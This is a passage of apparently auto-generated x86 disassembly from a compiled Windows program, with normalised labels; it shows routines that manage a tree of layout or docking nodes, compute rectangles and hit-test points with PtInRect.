sub_44586c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb9
call sub_403454
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_4458dd
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_43dc20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_4458f0
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_445b70
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_445920
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
mov [ eax + 0x9c ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_4456d0
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4456d0
mov esi eax
push ebp
call sub_4458f0
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_445b70
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_445664
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_445664
mov ecx ebx
pop edx
call sub_412b38
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43c8e0
mov eax [ ebp - 0x4 ]
call sub_445a98
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_445a98
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_445a98
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_445a98
push ebx
mov ebx eax
mov eax ebx
call sub_4455a0
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_445528
test al al
je r-xdata
mov eax ebx
call sub_4455d4
pop ebx
retn
sub_445ad4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_445ac0
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_445570
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_445ac4
mov edx esi
call sub_445ad4
sub_445b10
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_445a98
mov edi eax
mov eax ebx
call sub_4455d4
cmp edi eax
jl r-xdata
mov eax esi
call sub_445780
mov eax [ esi + 0x1c ]
push eax
push sub_447620
mov edx esi
call sub_445e4c
mov eax ebx
call sub_445a98
mov edi eax
mov eax esi
call sub_44561c
cmp edi eax
jle r-xdata
mov eax ebx
call sub_445b10
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_445b7c
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_4455a0
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_445ba4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403228
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x40000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
mov al [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_40357c
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_44554c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d43c
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_424098
mov edx eax
mov eax ebx
call sub_41d5b8
mov eax [ ebp - 0x4 ]
call sub_445d74
xor eax eax
push ebp
push sub_445cb0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_440438
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_445780
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445cb7
mov eax [ ebp - 0x4 ]
call sub_445d78
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4403fc
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_445cb7
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_447b48
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_445d0c
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_446d78
mov eax [ esi + 0x10 ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_445d8c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_445d8c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_445d8c
pop ecx
sub_445de4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_445d8c
pop ecx
sub_445e10
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_445e10
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_445e10
pop ecx
sub_445e64
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_445de4
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_4456d0
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_4456d0
push eax
mov edx 0x1
mov eax ebx
call sub_445664
push eax
mov edx 0x2
mov eax ebx
call sub_445664
pop edx
pop ecx
call sub_412b38
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402c64
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_445ee8
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_445920
jmp r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_412b38
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43c8e0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44554c
mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_445de4
mov [ ebp - 0x8 ] eax
xor eax eax
mov al [ ebp - 0x1 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_445570
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_446e10
mov edx esi
mov eax ebx
call sub_445de4
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_43cec4
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44554c
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
mov al [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
mov al [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_43ceb0
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
mov dl [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_4456d0
mov edx eax
mov eax edi
call sub_445ac0
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_4456d0
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_4456d0
mov edx eax
mov eax edi
call sub_445ac0
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_4456d0
mov [ ebx + 0x68 ] eax
jmp r-xdata
mov dl [ ebp - 0x9 ]
push edx
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_4460f8
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_4462a0
jmp r-xdata
sub_4460f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_44554c
mov ebx eax
mov al [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_445a98
mov edx eax
mov eax ebx
call sub_445ac0
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_445ac0
mov eax [ esi + 0x64 ]
call sub_445a98
mov [ esi + 0x68 ] eax
mov al [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_447168
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_445e4c
mov eax [ esi + 0x64 ]
call sub_445a98
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_447168
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_445e4c
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_4474ec
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_445e4c
mov eax [ esi + 0x64 ]
call sub_445a98
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_447620
xor edx edx
mov eax esi
call sub_445e4c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_445ac0
adc edx 0x0
mov eax ebx
call sub_445780
mov eax ebx
call sub_445b10
push esi
push sub_447620
xor edx edx
mov eax esi
call sub_445e4c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_4462a0
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_445780
mov eax [ ebx + 0x14 ]
call sub_445b10
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_446318
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_445a98
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_445a98
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_445a98
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_445664
mov esi eax
mov edx 0x2
mov eax ebx
call sub_445664
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax ebx
call sub_445a98
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_445b70
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_445b98
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_445b70
call sub_446318
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add esi [ edx + 0x18 ]
cmp eax esi
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_445b98
call sub_446318
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov edx 0x1
mov eax ebx
call sub_4456d0
add esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax ebx
call sub_4456d0
add edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edx [ eax ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
sub_446544
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_440438
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_4403fc
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
lea ecx [ ebp - 0x8 ]
call sub_412ae8
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4465d8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
push ebp
mov eax [ ebp - 0x4 ]
call sub_446544
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_445b98
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0xa0 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_445de4
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_445b98
call sub_446318
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_446660
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_403fa8
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4045f4
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_4466a8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4468a0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_446d78
mov eax [ ebp - 0x8 ]
call sub_445d74
xor edx edx
push ebp
push sub_446883
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edi [ ebp - 0x20 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
